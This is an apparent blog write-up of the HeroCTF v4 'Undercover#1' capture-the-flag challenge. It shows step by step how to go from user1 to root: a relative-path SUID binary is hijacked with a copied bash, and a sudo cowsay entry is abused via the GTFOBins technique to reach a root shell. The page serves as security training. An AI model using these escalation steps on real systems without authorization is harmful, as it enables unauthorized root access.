<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HeroCTF v4 : Undercover#1 | Sanlokii</title><meta name=keywords content><meta name=description content="System - Easy"><meta name=author content><link rel=canonical href=https://sanlokii.github.io/writeups/heroctf-v4/undercover1/><link crossorigin=anonymous href=/assets/css/stylesheet.css rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.js onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://sanlokii.github.io/assets/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sanlokii.github.io/assets/images/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sanlokii.github.io/assets/imagesfavicon-32x32.png><link rel=apple-touch-icon href=https://sanlokii.github.io/assets/images/apple-touch-icon.png><link rel=mask-icon href=https://sanlokii.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="HeroCTF v4 : Undercover#1"><meta property="og:description" content="System - Easy"><meta property="og:type" content="article"><meta property="og:url" content="https://sanlokii.github.io/writeups/heroctf-v4/undercover1/"><meta property="og:image" content="https://sanlokii.github.io/assets/images/apple-touch-icon.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2022-05-29T00:00:00+00:00"><meta property="article:modified_time" content="2022-05-29T00:00:00+00:00"><meta property="og:site_name" content="Sanlokii's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sanlokii.github.io/assets/images/apple-touch-icon.png"><meta name=twitter:title content="HeroCTF v4 : Undercover#1"><meta name=twitter:description content="System - Easy"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://sanlokii.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HeroCTF v4 : Undercover#1","item":"https://sanlokii.github.io/writeups/heroctf-v4/undercover1/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HeroCTF v4 : Undercover#1","name":"HeroCTF v4 : Undercover#1","description":"System - Easy","keywords":[],"articleBody":"Statement: You have been recruited by the CEO of Hero \u0026 Co. to test their security. But before handing you out the assignement, the asked you have to prove yourself, and escalate your privileges on this test system all the way to root.\nThe base credentials are: user1:password123\nOnce connected to the env with the default credentials, I start by listing the files in the home directory:\n# user1@d9551dfad93a:~$ ls -alh total 928K drwxr-xr-x 1 user1 user1 4.0K May 28 08:24 . drwxr-xr-x 1 root root 4.0K May 28 02:58 .. lrwxrwxrwx 1 root root 9 May 28 02:58 .bash_history -\u003e /dev/null -rw-r--r-- 1 user1 user1 220 May 28 02:58 .bash_logout -rw-r--r-- 1 user1 user1 3.7K May 28 02:58 .bashrc drwx------ 2 user1 user1 4.0K May 28 08:22 .cache -rw-r--r-- 1 user1 user1 807 May 28 02:58 .profile -rw-rw-r-- 1 user1 user1 165 May 28 08:24 .wget-hsts -rwsr-sr-x 1 user2 user2 894K May 28 02:51 hmmm We can see that user1 can execute the SUID binary hmmm owned by user2.\nSo I run the binary to see what happens:\n# user1@d9551dfad93a:~$ ./hmmm Not sure why, but I'm gonna set my ruid to my uid. Not sure why, but I'm gonna run the 'WTFFFFF' program right now. sh: 1: ./WTFFFFF: not found We can see that the binary tries to execute the ./WTFFFFF file with the relative path.\nSo I decide to copy /bin/bash in the home, rename it WTFFFFF and execute it to privesc to user2:\n# user1@d9551dfad93a:~$ cp /bin/bash ./WTFFFFF # user1@d9551dfad93a:~$ ./hmmm Not sure why, but I'm gonna set my ruid to my uid. Not sure why, but I'm gonna run the 'WTFFFFF' program right now. # user2@d9551dfad93a:~$ id uid=1001(user2) gid=1000(user1) groups=1000(user1) Once on the user2 shell, I list the authorized commands in /etc/sudoers:\n# user2@d9551dfad93a:/home/user2$ sudo -l Matching Defaults entries for user2 on d9551dfad93a: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user2 may run the following commands on d9551dfad93a: (root) NOPASSWD: /usr/games/cowsay I go to GTFOBins and I see that it is possible to privesc with the binary cowsay.\nI just have to reproduce the PoC:\n# user2@d9551dfad93a:/tmp$ TF=$(mktemp) # user2@d9551dfad93a:/tmp$ echo 'exec \"/bin/bash\";' \u003e$TF # user2@d9551dfad93a:/tmp$ sudo /usr/games/cowsay -f $TF x # root@d9551dfad93a:/tmp# id uid=0(root) gid=0(root) groups=0(root) Now root, I can cat the flag in /root :\n# root@d9551dfad93a:/tmp# cat /root/flag.txt\tHero{B4ck_2_b4s1cs} Flag: Hero{B4ck_2_b4s1cs}\n","wordCount":"385","inLanguage":"en","datePublished":"2022-05-29T00:00:00Z","dateModified":"2022-05-29T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://sanlokii.github.io/writeups/heroctf-v4/undercover1/"},"publisher":{"@type":"Organization","name":"Sanlokii","logo":{"@type":"ImageObject","url":"https://sanlokii.github.io/assets/images/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://sanlokii.github.io/ accesskey=h title="Sanlokii (Alt + H)"><img src=https://sanlokii.github.io/assets/images/yggdrasil_circle.png alt aria-label=logo height=40>Sanlokii</a><div class=logo-switches></div></div><ul id=menu><li><a href=https://sanlokii.github.io/writeups/ title=Writeups><span>Writeups</span></a></li><li><a href=https://sanlokii.github.io/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://sanlokii.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sanlokii.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://sanlokii.github.io/writeups/>Writeups</a></div><h1 class=post-title>HeroCTF v4 : Undercover#1</h1><div class=post-description>System - Easy</div><div class=post-meta><span title='2022-05-29 00:00:00 +0000 UTC'>May 29, 2022</span></div></header><div class=post-content><p><strong>Statement:</strong> You have been recruited by the CEO of Hero & Co. to test their security. But before handing you out the assignement, the asked you have to prove yourself, and escalate your privileges on this test system all the way to root.</p><p>The base credentials are: <code>user1:password123</code></p><hr><p>Once connected to the env with the default credentials, I start by listing the files in the home directory:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># user1@d9551dfad93a:~$ ls -alh</span>
</span></span><span style=display:flex><span>total 928K
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> user1 user1 4.0K May <span style=color:#ae81ff>28</span> 08:24 .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> root  root  4.0K May <span style=color:#ae81ff>28</span> 02:58 ..
</span></span><span style=display:flex><span>lrwxrwxrwx <span style=color:#ae81ff>1</span> root  root     <span style=color:#ae81ff>9</span> May <span style=color:#ae81ff>28</span> 02:58 .bash_history -&gt; /dev/null
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> user1 user1  <span style=color:#ae81ff>220</span> May <span style=color:#ae81ff>28</span> 02:58 .bash_logout
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> user1 user1 3.7K May <span style=color:#ae81ff>28</span> 02:58 .bashrc
</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>2</span> user1 user1 4.0K May <span style=color:#ae81ff>28</span> 08:22 .cache
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> user1 user1  <span style=color:#ae81ff>807</span> May <span style=color:#ae81ff>28</span> 02:58 .profile
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> user1 user1  <span style=color:#ae81ff>165</span> May <span style=color:#ae81ff>28</span> 08:24 .wget-hsts
</span></span><span style=display:flex><span>-rwsr-sr-x <span style=color:#ae81ff>1</span> user2 user2 894K May <span style=color:#ae81ff>28</span> 02:51 hmmm
</span></span></code></pre></div><p>We can see that user1 can execute the SUID binary <strong>hmmm</strong> owned by user2.</p><p>So I run the binary to see what happens:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># user1@d9551dfad93a:~$ ./hmmm</span>
</span></span><span style=display:flex><span>Not sure why, but I<span style=color:#e6db74>&#39;m gonna set my ruid to my uid.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Not sure why, but I&#39;</span>m gonna run the <span style=color:#e6db74>&#39;WTFFFFF&#39;</span> program right now.
</span></span><span style=display:flex><span>sh: 1: ./WTFFFFF: not found
</span></span></code></pre></div><p>We can see that the binary tries to execute the <code>./WTFFFFF</code> file with the relative path.</p><p>So I decide to copy <code>/bin/bash</code> in the home, rename it <strong>WTFFFFF</strong> and execute it to privesc to user2:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># user1@d9551dfad93a:~$ cp /bin/bash ./WTFFFFF</span>
</span></span><span style=display:flex><span><span style=color:#75715e># user1@d9551dfad93a:~$ ./hmmm</span>
</span></span><span style=display:flex><span>Not sure why, but I<span style=color:#e6db74>&#39;m gonna set my ruid to my uid.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Not sure why, but I&#39;</span>m gonna run the <span style=color:#e6db74>&#39;WTFFFFF&#39;</span> program right now.
</span></span><span style=display:flex><span><span style=color:#75715e># user2@d9551dfad93a:~$ id</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>user2<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>user1<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>user1<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Once on the user2 shell, I list the authorized commands in <code>/etc/sudoers</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># user2@d9551dfad93a:/home/user2$ sudo -l</span>
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> user2 on d9551dfad93a:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User user2 may run the following commands on d9551dfad93a:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/games/cowsay
</span></span></code></pre></div><p>I go to GTFOBins and I see that it is possible to privesc with the <a href=https://gtfobins.github.io/gtfobins/cowsay/>binary cowsay</a>.</p><p>I just have to reproduce the PoC:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># user2@d9551dfad93a:/tmp$ TF=$(mktemp)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># user2@d9551dfad93a:/tmp$ echo &#39;exec &#34;/bin/bash&#34;;&#39; &gt;$TF</span>
</span></span><span style=display:flex><span><span style=color:#75715e># user2@d9551dfad93a:/tmp$ sudo /usr/games/cowsay -f $TF x</span>
</span></span><span style=display:flex><span><span style=color:#75715e># root@d9551dfad93a:/tmp# id</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Now root, I can cat the flag in <code>/root</code> :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># root@d9551dfad93a:/tmp# cat /root/flag.txt	</span>
</span></span><span style=display:flex><span>Hero<span style=color:#f92672>{</span>B4ck_2_b4s1cs<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>Flag: <code>Hero{B4ck_2_b4s1cs}</code></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://sanlokii.github.io/writeups/heroctf-v4/smallmistakebigmistake/><span class=title>« Prev</span><br><span>HeroCTF v4 : SmallMistakeBigMistake</span></a>
<a class=next href=https://sanlokii.github.io/writeups/heroctf-v4/undercover2/><span class=title>Next »</span><br><span>HeroCTF v4 : Undercover#2</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HeroCTF v4 : Undercover#1 on twitter" href="https://twitter.com/intent/tweet/?text=HeroCTF%20v4%20%3a%20Undercover%231&url=https%3a%2f%2fsanlokii.github.io%2fwriteups%2fheroctf-v4%2fundercover1%2f&hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HeroCTF v4 : Undercover#1 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsanlokii.github.io%2fwriteups%2fheroctf-v4%2fundercover1%2f&title=HeroCTF%20v4%20%3a%20Undercover%231&summary=HeroCTF%20v4%20%3a%20Undercover%231&source=https%3a%2f%2fsanlokii.github.io%2fwriteups%2fheroctf-v4%2fundercover1%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sanlokii.github.io/>Sanlokii</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>